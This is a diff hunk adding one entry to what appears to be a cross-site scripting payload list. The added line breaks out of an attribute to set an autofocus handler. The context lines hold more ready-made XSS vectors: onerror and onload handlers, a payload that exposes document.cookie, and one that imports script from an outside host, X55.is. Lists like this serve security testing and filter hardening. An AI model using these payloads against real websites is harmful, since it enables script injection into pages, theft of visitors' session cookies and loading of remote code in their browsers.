@@ -4,6 +4,7 @@ OnXSS=<Img/Src/OnError=(alert)(1)>
 <A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
 a onclick="alert(1)">XSS</a>
 <svg onload=alert(1)>
+'" onfocus=alert(1) autofocus x="
 <img src=x onerror=alert(1)>
 "><img src="x:x" onerror=alert('xss')>
 -->"/><img src=@ onerror=prompt(document.cookie)>
